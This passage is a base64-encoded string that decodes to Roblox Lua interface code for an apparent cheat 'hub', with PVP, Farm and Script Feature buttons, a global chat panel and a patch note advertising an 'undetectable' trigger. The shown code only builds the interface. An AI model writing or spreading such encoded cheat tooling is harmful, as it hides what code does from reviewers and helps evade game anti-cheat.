Zpc2libGUgPSBmYWxzZQogICAgUmlnaHRUYWJDb250YWluZXIuUGFyZW50ID0gUmlnaHRQYW5lbAoKICAgIGxvY2FsIFJpZ2h0VGFiTGF5b3V0ID0gSW5zdGFuY2UubmV3KCJVSUxpc3RMYXlvdXQiKQogICAgUmlnaHRUYWJMYXlvdXQuRmlsbERpcmVjdGlvbiA9IEVudW0uRmlsbERpcmVjdGlvbi5Ib3Jpem9udGFsCiAgICBSaWdodFRhYkxheW91dC5Tb3J0T3JkZXIgPSBFbnVtLlNvcnRPcmRlci5MYXlvdXRPcmRlcgogICAgUmlnaHRUYWJMYXlvdXQuUGFkZGluZyA9IFVEaW0ubmV3KDAsIDUpCiAgICBSaWdodFRhYkxheW91dC5QYXJlbnQgPSBSaWdodFRhYkNvbnRhaW5lcgoKICAgIGxvY2FsIFJpZ2h0UGFnZUNvbnRhaW5lciA9IEluc3RhbmNlLm5ldygiRnJhbWUiKQogICAgUmlnaHRQYWdlQ29udGFpbmVyLlNpemUgPSBVRGltMi5uZXcoMSwgLTIwLCAxLCAtODApCiAgICBSaWdodFBhZ2VDb250YWluZXIuUG9zaXRpb24gPSBVRGltMi5uZXcoMCwgMTAsIDAsIDc1KQogICAgUmlnaHRQYWdlQ29udGFpbmVyLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCiAgICBSaWdodFBhZ2VDb250YWluZXIuVmlzaWJsZSA9IGZhbHNlCiAgICBSaWdodFBhZ2VDb250YWluZXIuUGFyZW50ID0gUmlnaHRQYW5lbAoKICAgIC0tIEhVQiBNRU5VICYgQlVUVE9OUwogICAgbG9jYWwgSHViTWVudSA9IEluc3RhbmNlLm5ldygiU2Nyb2xsaW5nRnJhbWUiKQogICAgSHViTWVudS5OYW1lID0gIkh1Yk1lbnUiCiAgICBIdWJNZW51LlNpemUgPSBVRGltMi5uZXcoMSwgLTIwLCAxLCAtNTApCiAgICBIdWJNZW51LlBvc2l0aW9uID0gVURpbTIubmV3KDAsIDEwLCAwLCA0MCkKICAgIEh1Yk1lbnUuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKICAgIEh1Yk1lbnUuQm9yZGVyU2l6ZVBpeGVsID0gMAogICAgSHViTWVudS5TY3JvbGxCYXJUaGlja25lc3MgPSAyCiAgICBIdWJNZW51LkF1dG9tYXRpY0NhbnZhc1NpemUgPSBFbnVtLkF1dG9tYXRpY1NpemUuWQogICAgSHViTWVudS5DYW52YXNTaXplID0gVURpbTIubmV3KDAsIDAsIDAsIDApCiAgICBIdWJNZW51LlBhcmVudCA9IFJpZ2h0UGFuZWwKICAgIAogICAgbG9jYWwgSHViTGF5b3V0ID0gSW5zdGFuY2UubmV3KCJVSUxpc3RMYXlvdXQiKQogICAgSHViTGF5b3V0LlNvcnRPcmRlciA9IEVudW0uU29ydE9yZGVyLkxheW91dE9yZGVyCiAgICBIdWJMYXlvdXQuUGFkZGluZyA9IFVEaW0ubmV3KDAsIDEwKQogICAgSHViTGF5b3V0LlBhcmVudCA9IEh1Yk1lbnUKICAgIAogICAgbG9jYWwgZnVuY3Rpb24gY3JlYXRlSHViQnRuKHRleHQsIG9yZGVyKQogICAgICAgIGxvY2FsIEJ0biA9IEluc3RhbmNlLm5ldygiVGV4dEJ1dHRvbiIpCiAgICAgICAgQnRuLlNpemUgPSBVRGltMi5uZXcoMSwgMCwgMCwgMzApIC0tIFRhaWxsZSByw6lkdWl0ZSBkZSA0MCDDoCAzMAogICAgICAgIEJ0bi5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjUsIDI1LCAzMCkKICAgICAgICBCdG4uVGV4dENvbG9yMyA9IEN1cnJlbnRUaGVtZUNvbG9yCiAgICAgICAgQnRuLkZvbnQgPSBFbnVtLkZvbnQuR290aGFtQm9sZAogICAgICAgIEJ0bi5UZXh0U2l6ZSA9IDEyCiAgICAgICAgQnRuLlRleHQgPSB0ZXh0CiAgICAgICAgQnRuLkxheW91dE9yZGVyID0gb3JkZXIKICAgICAgICBCdG4uUGFyZW50ID0gSHViTWVudQogICAgICAgIAogICAgICAgIGxvY2FsIENvcm5lciA9IEluc3RhbmNlLm5ldygiVUlDb3JuZXIiKQogICAgICAgIENvcm5lci5Db3JuZXJSYWRpdXMgPSBVRGltLm5ldygwLCA2KQogICAgICAgIENvcm5lci5QYXJlbnQgPSBCdG4KICAgICAgICAKICAgICAgICBsb2NhbCBTdHJva2UgPSBJbnN0YW5jZS5uZXcoIlVJU3Ryb2tlIikKICAgICAgICBTdHJva2UuQ29sb3IgPSBDb2xvcjMuZnJvbVJHQig0MCwgNDAsIDUwKQogICAgICAgIFN0cm9rZS5UaGlja25lc3MgPSAxCiAgICAgICAgU3Ryb2tlLlBhcmVudCA9IEJ0bgogICAgICAgIAogICAgICAgIHJldHVybiBCdG4KICAgIGVuZAogICAgCiAgICBsb2NhbCBQVlBCdG4gPSBjcmVhdGVIdWJCdG4oIlBWUCIsIDEpCiAgICBsb2NhbCBGYXJtQnRuID0gY3JlYXRlSHViQnRuKCJGYXJtIiwgMikKICAgIGxvY2FsIFNob3BCdG4gPSBjcmVhdGVIdWJCdG4oIk1pc2MiLCAzKQogICAgbG9jYWwgQ3VzdG9tQnRuID0gY3JlYXRlSHViQnRuKCJTY3JpcHQgRmVhdHVyZSIsIDQpCiAgICBsb2NhbCBTb2NpYWxzQnRuID0gY3JlYXRlSHViQnRuKCJDeWJlcnB1bmtzIFNvY2lhbHMiLCA1KQogICAgCiAgICBsb2NhbCBWaWRlb0NvbnRhaW5lciA9IEluc3RhbmNlLm5ldygiRnJhbWUiKQogICAgVmlkZW9Db250YWluZXIuTmFtZSA9ICJWaWRlb0NvbnRhaW5lciIKICAgIFZpZGVvQ29udGFpbmVyLlNpemUgPSBVRGltMi5uZXcoMSwgMCwgMCwgMTUwKSAtLSBHcmFuZCBjYXJyw6kgKFLDqWR1aXQpCiAgICBWaWRlb0NvbnRhaW5lci5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQogICAgVmlkZW9Db250YWluZXIuTGF5b3V0T3JkZXIgPSA3CiAgICBWaWRlb0NvbnRhaW5lci5QYXJlbnQgPSBIdWJNZW51CiAgICAKICAgIGxvY2FsIFZpZENvcm5lciA9IEluc3RhbmNlLm5ldygiVUlDb3JuZXIiKSBWaWRDb3JuZXIuQ29ybmVyUmFkaXVzID0gVURpbS5uZXcoMCwgNikgVmlkQ29ybmVyLlBhcmVudCA9IFZpZGVvQ29udGFpbmVyCiAgICAKICAgIGxvY2FsIEltYWdlVmlld2VyID0gSW5zdGFuY2UubmV3KCJJbWFnZUxhYmVsIikKICAgIEltYWdlVmlld2VyLlNpemUgPSBVRGltMi5uZXcoMCwgODAsIDAsIDgwKQogICAgSW1hZ2VWaWV3ZXIuUG9zaXRpb24gPSBVRGltMi5uZXcoMC41LCAtNDAsIDAuMSwgMCkKICAgIEltYWdlVmlld2VyLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCiAgICBJbWFnZVZpZXdlci5JbWFnZSA9ICJyYnh0aHVtYjovL3R5cGU9QXZhdGFySGVhZFNob3QmaWQ9IiAuLiBwbGF5ZXIuVXNlcklkIC4uICImdz00MjAmaD00MjAiCiAgICBJbWFnZVZpZXdlci5TY2FsZVR5cGUgPSBFbnVtLlNjYWxlVHlwZS5GaXQKICAgIEltYWdlVmlld2VyLlBhcmVudCA9IFZpZGVvQ29udGFpbmVyCiAgICBsb2NhbCBJbWdDb3JuZXIgPSBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIikgSW1nQ29ybmVyLkNvcm5lclJhZGl1cyA9IFVEaW0ubmV3KDEsIDApIEltZ0Nvcm5lci5QYXJlbnQgPSBJbWFnZVZpZXdlcgogICAgCiAgICBsb2NhbCBOYW1lTGFiZWwgPSBJbnN0YW5jZS5uZXcoIlRleHRMYWJlbCIpCiAgICBOYW1lTGFiZWwuVGV4dCA9IHBsYXllci5EaXNwbGF5TmFtZQogICAgTmFtZUxhYmVsLlNpemUgPSBVRGltMi5uZXcoMSwgMCwgMCwgMjApCiAgICBOYW1lTGFiZWwuUG9zaXRpb24gPSBVRGltMi5uZXcoMCwgMCwgMC42NSwgMCkKICAgIE5hbWVMYWJlbC5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQogICAgTmFtZUxhYmVsLlRleHRDb2xvcjMgPSBDdXJyZW50VGhlbWVDb2xvcgogICAgTmFtZUxhYmVsLkZvbnQgPSBFbnVtLkZvbnQuR290aGFtQm9sZAogICAgTmFtZUxhYmVsLlRleHRTaXplID0gMTQKICAgIE5hbWVMYWJlbC5QYXJlbnQgPSBWaWRlb0NvbnRhaW5lcgogICAgCiAgICBsb2NhbCBVc2VyTGFiZWwgPSBJbnN0YW5jZS5uZXcoIlRleHRMYWJlbCIpCiAgICBVc2VyTGFiZWwuVGV4dCA9ICJAIiAuLiBwbGF5ZXIuTmFtZQogICAgVXNlckxhYmVsLlNpemUgPSBVRGltMi5uZXcoMSwgMCwgMCwgMTUpCiAgICBVc2VyTGFiZWwuUG9zaXRpb24gPSBVRGltMi5uZXcoMCwgMCwgMC44LCAwKQogICAgVXNlckxhYmVsLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCiAgICBVc2VyTGFiZWwuVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDE1MCwgMTUwLCAxNTApCiAgICBVc2VyTGFiZWwuRm9udCA9IEVudW0uRm9udC5Hb3RoYW0KICAgIFVzZXJMYWJlbC5UZXh0U2l6ZSA9IDEwCiAgICBVc2VyTGFiZWwuUGFyZW50ID0gVmlkZW9Db250YWluZXIKICAgIAogICAgbG9jYWwgU2V0dGluZ3NCdG4gPSBJbnN0YW5jZS5uZXcoIlRleHRCdXR0b24iKQogICAgU2V0dGluZ3NCdG4uTmFtZSA9ICJTZXR0aW5nc0ljb24iCiAgICBTZXR0aW5nc0J0bi5UZXh0ID0gIuKamSIKICAgIFNldHRpbmdzQnRuLlNpemUgPSBVRGltMi5uZXcoMCwgMzAsIDAsIDMwKQogICAgU2V0dGluZ3NCdG4uUG9zaXRpb24gPSBVRGltMi5uZXcoMSwgLTEwLCAxLCAtMTApCiAgICBTZXR0aW5nc0J0bi5BbmNob3JQb2ludCA9IFZlY3RvcjIubmV3KDEsIDEpCiAgICBTZXR0aW5nc0J0bi5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjUsIDI1LCAzMCkKICAgIFNldHRpbmdzQnRuLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyMDAsIDIwMCwgMjAwKQogICAgU2V0dGluZ3NCdG4uRm9udCA9IEVudW0uRm9udC5Hb3RoYW1Cb2xkCiAgICBTZXR0aW5nc0J0bi5UZXh0U2l6ZSA9IDE4CiAgICBTZXR0aW5nc0J0bi5QYXJlbnQgPSBSaWdodFBhbmVsCiAgICAKICAgIGxvY2FsIFNldENvcm5lciA9IEluc3RhbmNlLm5ldygiVUlDb3JuZXIiKQogICAgU2V0Q29ybmVyLkNvcm5lclJhZGl1cyA9IFVEaW0ubmV3KDAsIDQpCiAgICBTZXRDb3JuZXIuUGFyZW50ID0gU2V0dGluZ3NCdG4KICAgIAogICAgLS0gPT09IFBBVENIIE5PVEVTIEJVVFRPTiAoTkVPTikgPT09CiAgICBsb2NhbCBQYXRjaE5vdGVzQnRuID0gSW5zdGFuY2UubmV3KCJUZXh0QnV0dG9uIikKICAgIFBhdGNoTm90ZXNCdG4uTmFtZSA9ICJQYXRjaE5vdGVzQnRuIgogICAgUGF0Y2hOb3Rlc0J0bi5UZXh0ID0gIvCfk7AiCiAgICBQYXRjaE5vdGVzQnRuLlNpemUgPSBVRGltMi5uZXcoMCwgMzAsIDAsIDMwKQogICAgUGF0Y2hOb3Rlc0J0bi5Qb3NpdGlvbiA9IFVEaW0yLm5ldygxLCAtNDUsIDEsIC0xMCkgLS0gTGVmdCBvZiBTZXR0aW5nc0J0bgogICAgUGF0Y2hOb3Rlc0J0bi5BbmNob3JQb2ludCA9IFZlY3RvcjIubmV3KDEsIDEpCiAgICBQYXRjaE5vdGVzQnRuLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNSwgMjUsIDMwKQogICAgUGF0Y2hOb3Rlc0J0bi5UZXh0Q29sb3IzID0gQ3VycmVudFRoZW1lQ29sb3IKICAgIFBhdGNoTm90ZXNCdG4uRm9udCA9IEVudW0uRm9udC5Hb3RoYW1Cb2xkCiAgICBQYXRjaE5vdGVzQnRuLlRleHRTaXplID0gMTgKICAgIFBhdGNoTm90ZXNCdG4uUGFyZW50ID0gUmlnaHRQYW5lbAogICAgCiAgICBsb2NhbCBQTkMgPSBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIikgUE5DLkNvcm5lclJhZGl1cyA9IFVEaW0ubmV3KDAsIDQpIFBOQy5QYXJlbnQgPSBQYXRjaE5vdGVzQnRuCiAgICBsb2NhbCBQTlN0cm9rZSA9IEluc3RhbmNlLm5ldygiVUlTdHJva2UiKSBQTlN0cm9rZS5Db2xvciA9IEN1cnJlbnRUaGVtZUNvbG9yIFBOU3Ryb2tlLlRoaWNrbmVzcyA9IDEgUE5TdHJva2UuVHJhbnNwYXJlbmN5ID0gMC42IFBOU3Ryb2tlLlBhcmVudCA9IFBhdGNoTm90ZXNCdG4KCiAgICAtLSBOZW9uIEJyZWF0aGluZyBBbmltYXRpb24KICAgIGxvY2FsIHR3ZWVuSW5mbyA9IFR3ZWVuSW5mby5uZXcoMSwgRW51bS5FYXNpbmdTdHlsZS5TaW5lLCBFbnVtLkVhc2luZ0RpcmVjdGlvbi5Jbk91dCwgLTEsIHRydWUpCiAgICBsb2NhbCB0d2VlbiA9IFR3ZWVuU2VydmljZTpDcmVhdGUoUE5TdHJva2UsIHR3ZWVuSW5mbywge1RyYW5zcGFyZW5jeSA9IDAuMX0pCiAgICB0d2VlbjpQbGF5KCkKCiAgICAtLSBQQVRDSCBOT1RFUyBQQUdFCiAgICBsb2NhbCBQYXRjaE5vdGVzUGFnZSA9IEluc3RhbmNlLm5ldygiU2Nyb2xsaW5nRnJhbWUiKQogICAgUGF0Y2hOb3Rlc1BhZ2UuTmFtZSA9ICJQYXRjaE5vdGVzUGFnZSIKICAgIFBhdGNoTm90ZXNQYWdlLlNpemUgPSBVRGltMi5uZXcoMSwgLTIwLCAxLCAtNTApCiAgICBQYXRjaE5vdGVzUGFnZS5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLCAxMCwgMCwgNDApCiAgICBQYXRjaE5vdGVzUGFnZS5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQogICAgUGF0Y2hOb3Rlc1BhZ2UuQm9yZGVyU2l6ZVBpeGVsID0gMAogICAgUGF0Y2hOb3Rlc1BhZ2UuU2Nyb2xsQmFyVGhpY2tuZXNzID0gMgogICAgUGF0Y2hOb3Rlc1BhZ2UuQXV0b21hdGljQ2FudmFzU2l6ZSA9IEVudW0uQXV0b21hdGljU2l6ZS5ZCiAgICBQYXRjaE5vdGVzUGFnZS5DYW52YXNTaXplID0gVURpbTIubmV3KDAsIDAsIDAsIDApCiAgICBQYXRjaE5vdGVzUGFnZS5WaXNpYmxlID0gZmFsc2UKICAgIFBhdGNoTm90ZXNQYWdlLlBhcmVudCA9IFJpZ2h0UGFuZWwKICAgIAogICAgbG9jYWwgUE5MYXlvdXQgPSBJbnN0YW5jZS5uZXcoIlVJTGlzdExheW91dCIpIFBOTGF5b3V0LlNvcnRPcmRlciA9IEVudW0uU29ydE9yZGVyLkxheW91dE9yZGVyIFBOTGF5b3V0LlBhZGRpbmcgPSBVRGltLm5ldygwLCA1KSBQTkxheW91dC5QYXJlbnQgPSBQYXRjaE5vdGVzUGFnZQogICAgCiAgICBsb2NhbCBmdW5jdGlvbiBhZGRQYXRjaE5vdGUodmVyc2lvbiwgdGV4dCkKICAgICAgICBsb2NhbCBmcmFtZSA9IEluc3RhbmNlLm5ldygiRnJhbWUiKQogICAgICAgIGZyYW1lLkF1dG9tYXRpY1NpemUgPSBFbnVtLkF1dG9tYXRpY1NpemUuWQogICAgICAgIGZyYW1lLlNpemUgPSBVRGltMi5uZXcoMSwgMCwgMCwgMCkKICAgICAgICBmcmFtZS5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjUsIDI1LCAzMCkKICAgICAgICBmcmFtZS5QYXJlbnQgPSBQYXRjaE5vdGVzUGFnZQogICAgICAgIGxvY2FsIGMgPSBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIikgYy5Db3JuZXJSYWRpdXMgPSBVRGltLm5ldygwLCA0KSBjLlBhcmVudCA9IGZyYW1lCiAgICAgICAgCiAgICAgICAgbG9jYWwgdkxhYmVsID0gSW5zdGFuY2UubmV3KCJUZXh0TGFiZWwiKQogICAgICAgIHZMYWJlbC5OYW1lID0gIlZlcnNpb25MYWJlbCIKICAgICAgICB2TGFiZWwuVGV4dCA9IHZlcnNpb24KICAgICAgICB2TGFiZWwuU2l6ZSA9IFVEaW0yLm5ldygxLCAtMTAsIDAsIDIwKQogICAgICAgIHZMYWJlbC5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLCA1LCAwLCAwKQogICAgICAgIHZMYWJlbC5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQogICAgICAgIHZMYWJlbC5UZXh0Q29sb3IzID0gQ3VycmVudFRoZW1lQ29sb3IKICAgICAgICB2TGFiZWwuRm9udCA9IEVudW0uRm9udC5Hb3RoYW1Cb2xkCiAgICAgICAgdkxhYmVsLlRleHRTaXplID0gMTAKICAgICAgICB2TGFiZWwuVGV4dFhBbGlnbm1lbnQgPSBFbnVtLlRleHRYQWxpZ25tZW50LkxlZnQKICAgICAgICB2TGFiZWwuUGFyZW50ID0gZnJhbWUKICAgICAgICAKICAgICAgICBsb2NhbCB0TGFiZWwgPSBJbnN0YW5jZS5uZXcoIlRleHRMYWJlbCIpCiAgICAgICAgdExhYmVsLlRleHQgPSB0ZXh0CiAgICAgICAgdExhYmVsLlNpemUgPSBVRGltMi5uZXcoMSwgLTEwLCAwLCAwKQogICAgICAgIHRMYWJlbC5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLCA1LCAwLCAyMCkKICAgICAgICB0TGFiZWwuQXV0b21hdGljU2l6ZSA9IEVudW0uQXV0b21hdGljU2l6ZS5ZCiAgICAgICAgdExhYmVsLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCiAgICAgICAgdExhYmVsLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyMDAsIDIwMCwgMjAwKQogICAgICAgIHRMYWJlbC5Gb250ID0gRW51bS5Gb250LkdvdGhhbQogICAgICAgIHRMYWJlbC5UZXh0U2l6ZSA9IDkKICAgICAgICB0TGFiZWwuVGV4dFhBbGlnbm1lbnQgPSBFbnVtLlRleHRYQWxpZ25tZW50LkxlZnQKICAgICAgICB0TGFiZWwuVGV4dFdyYXBwZWQgPSB0cnVlCiAgICAgICAgdExhYmVsLlBhcmVudCA9IGZyYW1lCiAgICAgICAgCiAgICAgICAgbG9jYWwgcGFkID0gSW5zdGFuY2UubmV3KCJVSVBhZGRpbmciKSBwYWQuUGFkZGluZ0JvdHRvbSA9IFVEaW0ubmV3KDAsIDUpIHBhZC5QYXJlbnQgPSBmcmFtZQogICAgZW5kCiAgICAKICAgIGFkZFBhdGNoTm90ZSgidjEwLjcgKExhdGVzdCkiLCAiTmV3IEZsYXNoU3RlcCBUcmlnZ2VyLCB1bmRldGVjdGFibGUiKQogICAgCiAgICAtLSBTT0NJQUxTIFBBR0UgKENoYXQgJiBVc2VycykKICAgIGxvY2FsIFNvY2lhbHNQYWdlID0gSW5zdGFuY2UubmV3KCJGcmFtZSIpCiAgICBTb2NpYWxzUGFnZS5OYW1lID0gIlNvY2lhbHNQYWdlIgogICAgU29jaWFsc1BhZ2UuU2l6ZSA9IFVEaW0yLm5ldygxLCAtMjAsIDEsIC0xNTApIC0tIFLDqWR1aXQgZW5jb3JlIHBsdXMgcG91ciDDqXZpdGVyIGxlIGNoZXZhdWNoZW1lbnQKICAgIFNvY2lhbHNQYWdlLlBvc2l0aW9uID0gVURpbTIubmV3KDAsIDEwLCAwLCA0MCkKICAgIFNvY2lhbHNQYWdlLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCiAgICBTb2NpYWxzUGFnZS5WaXNpYmxlID0gZmFsc2UKICAgIFNvY2lhbHNQYWdlLlBhcmVudCA9IFJpZ2h0UGFuZWwKICAgIAogICAgbG9jYWwgT25saW5lTGFiZWwgPSBJbnN0YW5jZS5uZXcoIlRleHRMYWJlbCIpCiAgICBPbmxpbmVMYWJlbC5TaXplID0gVURpbTIubmV3KDEsIDAsIDAsIDIwKQogICAgT25saW5lTGFiZWwuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKICAgIE9ubGluZUxhYmVsLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigwLCAyNTUsIDE1MCkKICAgIE9ubGluZUxhYmVsLkZvbnQgPSBFbnVtLkZvbnQuR290aGFtQm9sZAogICAgT25saW5lTGFiZWwuVGV4dFNpemUgPSAxMAogICAgT25saW5lTGFiZWwuVGV4dCA9ICJBY3RpdmUgVXNlcnM6IC4uLiIKICAgIE9ubGluZUxhYmVsLlBhcmVudCA9IFNvY2lhbHNQYWdlCiAgICAKICAgIGxvY2FsIFVzZXJMaXN0ID0gSW5zdGFuY2UubmV3KCJTY3JvbGxpbmdGcmFtZSIpCiAgICBVc2VyTGlzdC5TaXplID0gVURpbTIubmV3KDEsIDAsIDAsIDgwKQogICAgVXNlckxpc3QuUG9zaXRpb24gPSBVRGltMi5uZXcoMCwgMCwgMCwgMjUpCiAgICBVc2VyTGlzdC5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjUsIDI1LCAzMCkKICAgIFVzZXJMaXN0LkJvcmRlclNpemVQaXhlbCA9IDAKICAgIFVzZXJMaXN0LlNjcm9sbEJhclRoaWNrbmVzcyA9IDIKICAgIFVzZXJMaXN0LkF1dG9tYXRpY0NhbnZhc1NpemUgPSBFbnVtLkF1dG9tYXRpY1NpemUuWQogICAgVXNlckxpc3QuQ2FudmFzU2l6ZSA9IFVEaW0yLm5ldygwLCAwLCAwLCAwKQogICAgVXNlckxpc3QuUGFyZW50ID0gU29jaWFsc1BhZ2UKICAgIGxvY2FsIFVMQ29ybmVyID0gSW5zdGFuY2UubmV3KCJVSUNvcm5lciIpIFVMQ29ybmVyLkNvcm5lclJhZGl1cyA9IFVEaW0ubmV3KDAsIDQpIFVMQ29ybmVyLlBhcmVudCA9IFVzZXJMaXN0CiAgICBsb2NhbCBVTExheW91dCA9IEluc3RhbmNlLm5ldygiVUlMaXN0TGF5b3V0IikgVUxMYXlvdXQuUGFkZGluZyA9IFVEaW0ubmV3KDAsIDIpIFVMTGF5b3V0LlBhcmVudCA9IFVzZXJMaXN0CiAgICBsb2NhbCBVTFBhZGRpbmcgPSBJbnN0YW5jZS5uZXcoIlVJUGFkZGluZyIpIFVMUGFkZGluZy5QYWRkaW5nTGVmdCA9IFVEaW0ubmV3KDAsIDUpIFVMUGFkZGluZy5QYWRkaW5nVG9wID0gVURpbS5uZXcoMCwgNSkgVUxQYWRkaW5nLlBhcmVudCA9IFVzZXJMaXN0CiAgICAKICAgIGxvY2FsIENoYXRMYWJlbCA9IEluc3RhbmNlLm5ldygiVGV4dExhYmVsIikKICAgIENoYXRMYWJlbC5TaXplID0gVURpbTIubmV3KDAuOCwgMCwgMCwgMjApCiAgICBDaGF0TGFiZWwuUG9zaXRpb24gPSBVRGltMi5uZXcoMCwgMCwgMCwgMTEwKQogICAgQ2hhdExhYmVsLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCiAgICBDaGF0TGFiZWwuVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDIwMCwgMjAwLCAyMDApCiAgICBDaGF0TGFiZWwuRm9udCA9IEVudW0uRm9udC5Hb3RoYW1Cb2xkCiAgICBDaGF0TGFiZWwuVGV4dFNpemUgPSAxMAogICAgQ2hhdExhYmVsLlRleHQgPSAiR2xvYmFsIENoYXQiCiAgICBDaGF0TGFiZWwuVGV4dFhBbGlnbm1lbnQgPSBFbnVtLlRleHRYQWxpZ25tZW50LkxlZnQKICAgIENoYXRMYWJlbC5QYXJlbnQgPSBTb2NpYWxzUGFnZQogICAgCiAgICBsb2NhbCBSZWZyZXNoQnRuID0gSW5zdGFuY2UubmV3KCJUZXh0QnV0dG9uIikKICAgIFJlZnJlc2hCdG4uU2l6ZSA9IFVEaW0yLm5ldygwLjE4LCAwLCAwLCAyMCkKICAgIFJlZnJlc2hCdG4uUG9zaXRpb24gPSBVRGltMi5uZXcoMC42NSwgMCwgMCwgMTEwKQogICAgUmVmcmVzaEJ0bi5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoNTAsIDUwLCA3MCkKICAgIFJlZnJlc2hCdG4uVGV4dENvbG9yMyA9IEN1cnJlbnRUaGVtZUNvbG9yCiAgICBSZWZyZXNoQnRuLkZvbnQgPSBFbnVtLkZvbnQuR290aGFtQm9sZAogICAgUmVmcmVzaEJ0bi5UZXh0U2l6ZSA9IDkKICAgIFJlZnJlc2hCdG4uVGV4dCA9ICLwn5SEIFJFRlJFU0giCiAgICBSZWZyZXNoQnRuLlBhcmVudCA9IFNvY2lhbHNQYWdlCiAgICBsb2NhbCBSRkNvcm5lciA9IEluc3RhbmNlLm5ldygiVUlDb3JuZXIiKSBSRkNvcm5lci5Db3JuZXJSYWRpdXMgPSBVRGltLm5ldygwLCAzKSBSRkNvcm5lci5QYXJlbnQgPSBSZWZyZXNoQnRuCiAgICBsb2NhbCBSRlN0cm9rZSA9IEluc3RhbmNlLm5ldygiVUlTdHJva2UiKSBSRlN0cm9rZS5Db2xvciA9IEN1cnJlbnRUaGVtZUNvbG9yIFJGU3Ryb2tlLlRoaWNrbmVzcyA9IDEgUkZTdHJva2UuVHJhbnNwYXJlbmN5ID0gMC43IFJGU3Ryb2tlLlBhcmVudCA9IFJlZnJlc2hCdG4KICAgIAogICAgbG9jYWwgQ2hhdFNjcm9sbCA9IEluc3RhbmNlLm5ldygiU2Nyb2xsaW5nRnJhbWUiKQogICAgQ2hhdFNjcm9sbC5TaXplID0gVURpbTIubmV3KDEsIDAsIDEsIC0xNjApIC0tIEFqdXN0w6kgcG91ciBsYSBub3V2ZWxsZSB0YWlsbGUKICAgIENoYXRTY3JvbGwuUG9zaXRpb24gPSBVRGltMi5uZXcoMCwgMCwgMCwgMTMwKQogICAgQ2hhdFNjcm9sbC5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjUsIDI1LCAzMCkKICAgIENoYXRTY3JvbGwuQm9yZGVyU2l6ZVBpeGVsID0gMAogICAgQ2hhdFNjcm9sbC5TY3JvbGxCYXJUaGlja25lc3MgPSAyCiAgICBDaGF0U2Nyb2xsLkF1dG9tYXRpY0NhbnZhc1NpemUgPSBFbnVtLkF1dG9tYXRpY1NpemUuWQogICAgQ2hhdFNjcm9sbC5QYXJlbnQgPSBTb2NpYWxzUGFnZQogICAgbG9jYWwgQ1NDb3JuZXIgPSBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIikgQ1NDb3JuZXIuQ29ybmVyUmFkaXVzID0gVURpbS5uZXcoMCwgNCkgQ1NDb3JuZXIuUGFyZW50ID0gQ2hhdFNjcm9sbAogICAgbG9jYWwgQ1NMYXlvdXQgPSBJbnN0YW5jZS5uZXcoIlVJTGlzdExheW91dCIpIENTTGF5b3V0LlBhZGRpbmcgPSBVRGltLm5ldygwLCA0KSBDU0xheW91dC5QYXJlbnQgPSBDaGF0U2Nyb2xsCiAgICBsb2NhbCBDU1BhZGRpbmcgPSBJbnN0YW5jZS5uZXcoIlVJUGFkZGluZyIpIENTUGFkZGluZy5QYWRkaW5nTGVmdCA9IFVEaW0ubmV3KDAsIDUpIENTUGFkZGluZy5QYWRkaW5nVG9wID0gVURpbS5uZXcoMCwgNSkgQ1NQYWRkaW5nLlBhcmVudCA9IENoYXRTY3JvbGwKICAgIAogICAgbG9jYWwgQ2hhdElucHV0ID0gSW5zdGFuY2UubmV3KCJUZXh0Qm94IikKICAgIENoYXRJbnB1dC5TaXplID0gVURpbTIubmV3KDAuNzUsIDAsIDAsIDI1KQogICAgQ2hhdElucHV0LlBvc2l0aW9uID0gVURpbTIubmV3KDAsIDAsIDEsIC0yNSkKICAgIENoYXRJbnB1dC5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMzAsIDMwLCA0MCkKICAgIENoYXRJbnB1dC5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSkKICAgIENoYXRJbnB1dC5Gb250ID0gRW51bS5Gb250LkdvdGhhbQogICAgQ2hhdElucHV0LlRleHRTaXplID0gMTAKICAgIENoYXRJbnB1dC5QbGFjZWhvbGRlclRleHQgPSAiTWVzc2FnZS4uLiIKICAgIENoYXRJbnB1dC5UZXh0ID0gIiIKICAgIENoYXRJbnB1dC5QYXJlbnQgPSBTb2NpYWxzUGFnZQog" .. 